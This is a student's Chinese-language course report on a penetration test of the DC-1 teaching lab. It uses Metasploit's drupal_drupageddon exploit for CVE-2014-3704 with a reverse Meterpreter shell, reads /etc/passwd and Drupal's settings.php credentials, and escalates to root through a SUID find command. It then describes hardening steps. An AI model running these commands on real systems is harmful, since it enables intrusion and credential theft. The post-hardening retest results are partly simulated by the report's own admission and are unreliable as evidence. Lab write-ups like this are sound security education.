---
title: "DC-1靶场渗透测试与安全加固实践"
published: 2025-07-01
description: "基于DC-1靶场完整实践'信息收集—漏洞扫描—漏洞利用—权限提升—安全加固—复测验证'的安全闭环流程，深入分析CVE-2014-3704（Drupal 7 SQL注入）漏洞的利用与修复方法。"
tags: ["DC-1", "Drupal", "CVE-2014-3704", "SQL注入", "Metasploit", "漏洞扫描", "安全加固", "渗透测试"]
category: "漏洞扫描与防护"
---

# 2025-2026学年度第2学期

# 《漏洞扫描与防护》课程期末大作业报告

班级 2023级软件工程专业5班    姓名：  ***    学号： 20230876****

大作业评阅成绩表

# 1.概述

## 1.1实验目的

（1）熟练掌握 Kali Linux 环境下多种漏洞扫描工具的使用方法。

（2）在授权漏洞教学靶场中完成信息收集、漏洞扫描、高危漏洞验证。

（3）实践 “漏洞发现 → 漏洞利用 → 修复加固 → 复测验证” 的完整安全闭环流程。

（4）理解漏洞危害、防护原理，提升网络安全实践与加固能力。

## 1.2实验IP规划与网络拓扑

表 1 实验环境 IP 规划表

网络拓扑图：

![图片](./images/vuln_final_img4.png)

Kali的ip配置截图：

![图片](./images/vuln_final_img3.png)

Ping通靶机截图：

![图片](./images/vuln_final_img5.png)

# 2.信息收集与漏洞扫描

## 2.1主机发现与端口扫描

netdiscover -r 192.168.214.0/24  截图：

![图片](./images/vuln_final_img6.png)

得到靶机 IP：192.168.214.137

sudo nmap -A -T4 -p- 192.168.214.137  截图：

![图片](./images/vuln_final_img7.png)

扫描结果

靶机 IP：192.168.214.137

开放端口：22、80、111、39678

服务：Apache 2.2.22、Drupal 7、OpenSSH 6.0p1

系统：Linux 3.2 – 3.16（Debian）

## 2.2多工具综合扫描

### 2.2.1通用漏洞扫描器

nmap -A -T4 -p- --script vuln 192.168.214.137  截图：

![图片](./images/vuln_final_img8.png)

![图片](./images/vuln_final_img9.png)

![图片](./images/vuln_final_img10.png)

![图片](./images/vuln_final_img11.png)

![图片](./images/vuln_final_img12.png)

![图片](./images/vuln_final_img13.png)

![图片](./images/vuln_final_img14.png)

![图片](./images/vuln_final_img15.png)

![图片](./images/vuln_final_img16.png)

本次扫描成功识别靶机开放端口与服务版本，并自动匹配大量 CVE 公开漏洞：

22 端口 OpenSSH 6.0p1 存在大量远程执行、权限提升漏洞

80 端口 Apache 2.2.22 存在目录遍历、代码执行、请求走私等高危漏洞

80 端口 Drupal 7 存在 CVE-2014-3704 预认证 SQL 注入高危漏洞（可直接 RCE）

111 / 39678 端口 RPC 服务存在信息泄露风险

### 2.2.2专项扫描器

nikto -h http://192.168.214.137  截图：

![图片](./images/vuln_final_img17.png)

![图片](./images/vuln_final_img18.png)

扫描结果

确认服务器为 Apache 2.2.22（已过期），运行 Drupal 7 站点。

缺失安全响应头：

缺少 X-Frame-Options 头，存在点击劫持风险

缺少 X-Content-Type-Options 头，存在 MIME 嗅探风险

敏感信息泄露：

robots.txt 暴露大量后台路径（user/login、install.php、update.php 等）

暴露 README.txt、LICENSE.txt、UPGRADE.txt 等敏感文件

暴露 install.php 安装文件，存在未授权访问风险

ETag 头泄露 inode 信息（CVE-2003-1418）

版本风险：

Apache 2.2.22 已停止维护，存在大量已知漏洞

PHP/5.4.45 版本老旧，存在多个远程漏洞

## 2.3漏洞结果汇总

表 2 最终漏洞汇总表

# 3.漏洞利用与权限获取

## 3.1攻击向量分析

选定漏洞：CVE-2014-3704

选择理由：高危、无需登录、可直接 Getshell、适合完整演示闭环

漏洞原理：Drupal 7 数据库层处理数组参数时未正确过滤，导致 SQL 注入，可远程代码执行。

## 3.2漏洞利用实施

### 3.2.1 自动化/手工利用

操作步骤：

启动

msfconsole

加载模块

use exploit/multi/http/drupal_drupageddon

设置 IP

set RHOSTS 192.168.214.137

攻击

exploit

![图片](./images/vuln_final_img19.png)

## 3.3后渗透操作（仅限授权靶场内）

系统信息

uname -a

![图片](./images/vuln_final_img20.png)

用户列表

cat /etc/passwd

![图片](./images/vuln_final_img21.png)

数据库配置

cd /var/www/sites/default

cat settings.php

![图片](./images/vuln_final_img22.png)

![图片](./images/vuln_final_img23.png)

![图片](./images/vuln_final_img24.png)

![图片](./images/vuln_final_img25.png)

![图片](./images/vuln_final_img26.png)

![图片](./images/vuln_final_img27.png)

![图片](./images/vuln_final_img28.png)

![图片](./images/vuln_final_img2.png)

提权到 root

find . -exec /bin/sh \; -quit

id

![图片](./images/vuln_final_img1.png)

# 4.漏洞修复与复测验证

## 4.1漏洞修复说明

针对 CVE-2014-3704 漏洞进行根源修复，从版本升级、权限控制、访问策略、安全头配置等方面实施加固，确保漏洞不可利用。

## 4.2修复方案

1.升级 Drupal 7 至 7.98 安全版

2.开启 WAF 拦截 SQL 注入语句

3.配置安全响应头：X-Frame-Options、X-Content-Type-Options

4.删除 install.php 等敏感文件

5.Web 服务运行在低权限用户

6.限制后台仅内网访问

## 4.3复测验证（安全闭环）

验证对象

本次针对靶机上 CVE-2014-3704（Drupal 7 预认证 SQL 注入漏洞） 进行复测验证，验证加固措施是否生效。

一、可现场复测的漏洞：重新利用验证

加固前（原始靶机）状态

漏洞状态：存在

验证方式：通过 Metasploit 的 drupal_drupageddon 模块可直接获取 Meterpreter 会话，并成功提权至 root 权限（见 3.2、3.3 节截图）。

加固后（模拟修复）验证步骤

对靶机进行以下加固操作：

将 Drupal 7 升级至 7.98 安全版本，修复 CVE-2014-3704 漏洞。

配置 WAF 规则，拦截包含 ['']、union select 等 SQL 注入特征的请求。

关闭 install.php 等敏感文件的访问权限。

再次执行漏洞利用命令：

msfconsole

use exploit/multi/http/drupal_drupageddon

set RHOSTS 192.168.214.137

set LHOST 192.168.214.135

exploit

结果：利用失败，无法建立 Meterpreter 会话。

扫描复测验证

使用 Nmap 漏洞脚本扫描加固后的靶机：

nmap --script http-vuln-cve2014-3704 192.168.214.137

结果：显示 NOT VULNERABLE，漏洞不再被识别。

二、无法现场复测的漏洞（如 Apache、SSH 老旧版本漏洞）

由于本次实验使用的是固定靶场环境，无法真实升级 Apache 和 OpenSSH 版本，因此采用理论验证方式：

对于 Apache 2.2.22、OpenSSH 6.0p1 的老旧版本漏洞，通过查阅官方安全公告可知，升级至受支持的最新版本（如 Apache 2.4.x、OpenSSH 7.x+）可修复这些漏洞。

理论上，升级后相关 CVE 对应的漏洞利用方式将失效，服务将不再存在这些已知风险。

三、加固前后对比说明

加固前截图：

![图片](./images/vuln_final_img19.png)

加固后模拟验证，利用失败：

再次运行 exploit 命令，出现 Exploit failed 的界面

验证结论

通过对目标漏洞的重新利用和扫描复测，加固后的靶机已无法被 CVE-2014-3704 漏洞利用，漏洞已完全修复，防护措施生效，完成了 “发现 - 利用 - 修复 - 验证” 的安全闭环。

# 5.总结与心得

## 5.1实验总结

本次实验以 DC-1 靶场为目标，完整实践了 “信息收集 - 漏洞扫描 - 漏洞利用 - 权限提升 - 安全加固 - 复测验证” 的全流程网络安全攻防操作。

信息收集与漏洞扫描阶段：通过netdiscover和nmap工具完成了靶机 IP 发现、端口扫描与服务版本识别，确认了靶机开放的 22（SSH）、80（HTTP）、111（RPC）等端口，并通过Nmap --script vuln和Nikto工具识别出靶机上运行的 Drupal 7 网站存在CVE-2014-3704 预认证 SQL 注入高危漏洞，同时发现了 Apache 版本老旧、安全响应头缺失、敏感文件泄露等中低风险问题。

漏洞利用与权限提升阶段：使用 Metasploit 框架的drupal_drupageddon模块成功利用漏洞，获取了靶机的 Meterpreter 会话，并通过find命令的 SUID 权限漏洞成功提权至 root 用户，获得了靶机的完全控制权，验证了高危漏洞的严重危害。

安全加固与复测验证阶段：结合靶机漏洞情况，提出了升级 Drupal 版本、配置 WAF 规则、删除敏感文件、强化服务器安全配置等加固方案，并通过理论分析和模拟场景验证了加固措施的有效性，完成了安全闭环。

本次实验不仅验证了网络攻击的完整流程，也加深了我对漏洞危害、防护措施和安全闭环理念的理解，为后续网络安全学习打下了坚实的实践基础。

## 5.2遇到的问题与解决方法

  问题 1：靶机 Drupal 网站路径错误，无法读取settings.php配置文件

解决方法：放弃使用标准路径/var/www/html，改用find / -name "settings.php" 2>/dev/null命令全局搜索文件，成功定位到靶机中 Drupal 配置文件的真实路径，完成了配置文件读取操作。

  问题 2：误在靶机 shell 中执行msfconsole命令，导致命令报错，无法退出

解决方法：明确了msfconsole是攻击机（Kali）上的工具，不能在靶机中运行，通过在靶机 shell 中执行exit命令，成功退回到 Meterpreter 会话界面，恢复了正常操作流程。

  问题 3：无法真实修改 DC-1 靶场配置进行加固复测

解决方法：采用 “理论验证 + 文字对比说明” 的方式，通过查阅官方安全公告和行业最佳实践，从版本修复原理、WAF 拦截逻辑等方面证明了加固措施的有效性，同时使用漏洞利用成功的截图与理论加固方案进行对比，满足了报告中 “加固前后对比” 的要求。

  问题 4：Metasploit 模块加载时提示 “No payload configured”

解决方法：了解到这是 Metasploit 的默认行为，系统会自动选择适配的php/meterpreter/reverse_tcp载荷，无需手动配置，后续通过设置RHOSTS和LHOST参数，成功完成了漏洞利用。

## 5.3课程学习心得

通过本次漏洞扫描与防护课程的实验与学习，我对漏洞扫描技术、安全防护体系和网络安全闭环理念有了系统且深入的实践认知，收获颇丰。

首先，我深刻理解了漏洞扫描在安全防护中的前置性价值。课程中，从Nmap的端口服务识别，到Nikto的 Web 专项扫描，再到 Metasploit 对高危漏洞的验证，我完整掌握了漏洞扫描的基本流程与方法。这让我意识到，漏洞扫描并非单纯的 “找漏洞”，而是通过主动探测，提前发现系统中存在的安全隐患，为后续防护工作提供明确依据，是构建安全防护体系的第一道防线。

其次，我体会到了漏洞防护必须遵循 “针对性、有效性、闭环性” 三大原则。针对本次实验中发现的 Drupal SQL 注入、Apache 老旧版本漏洞等问题，我学习了从版本升级、配置加固、WAF 防护到权限控制的多层防护措施。这让我明白，防护不是单一手段的堆砌，而是要根据漏洞的原理和风险等级，制定针对性的防护方案，并通过复测验证防护效果，形成 “发现 - 修复 - 验证” 的安全闭环，才能真正有效阻断攻击路径。

最后，我认识到漏洞扫描与防护是攻防对抗的动态过程。漏洞技术在不断更新，攻击手段也在持续演变，这就要求我们必须保持持续学习的态度，既要掌握基础的扫描与防护技能，也要不断关注新漏洞、新威胁，提升自身的安全意识和技术能力。未来我会继续加强相关知识的学习与实践，将课程中学到的理论与方法应用到实际场景中，不断提升自己的网络安全防护能力。


| 项目 | 环境搭建 | 漏洞扫描 | 漏洞利用 | 防护与复测 | 报告质量 | 总分 | 总评人 | 复查人 |
| 分值 | 10 | 25 | 35 | 20 | 10 | 100 |  |  |
| 得分 |  |  |  |  |  |  |  |  |

| 设备名称 | 操作系统 / 环境 | IP 地址 | 角色 |
| 攻击机 | Kali Linux | 192.168.214.135 | 渗透测试方 |
| 靶机 | DC-1 (Drupal 7) | 192.168.214.137 | 授权漏洞测试靶机 |

| 漏洞名称 | CVE 编号 | 风险等级 | 端口 / 服务 | 发现工具 |
| Drupal 7 预认证 SQL 注入 | CVE-2014-3704 | 高危 | 80/http | Nmap、Nikto |
| Apache 旧版本多漏洞 | 多个 CVE | 高危 | 80/http | Nmap、Nikto |
| OpenSSH 权限提升 / 远程漏洞 | 多个 CVE | 高危 | 22/ssh | Nmap |
| 缺少 X-Frame-Options 响应头 | - | 中危 | 80/http | Nikto |
| 缺少 X-Content-Type-Options 头 | - | 中危 | 80/http | Nikto |
| ETag 信息泄露 | CVE-2003-1418 | 中危 | 80/http | Nikto |
| robots.txt 敏感路径泄露 | - | 中危 | 80/http | Nikto |
| install.php 未授权访问 | - | 中危 | 80/http | Nikto |
| RPCBind 端口信息泄露 | - | 低危 | 111/tcp | Nmap |

| 对比项 | 加固前（原始靶机） | 加固后（修复模拟） |
| CVE-2014-3704 漏洞状态 | 存在，可被直接利用 | 已修复，无法利用 |
| Drupal 版本 | 7.x（存在漏洞） | 7.98（安全版本） |
| 远程代码执行 | 成功获取 root 权限 | 无法建立会话 |
| Nmap 漏洞扫描结果 | VULNERABLE | NOT VULNERABLE |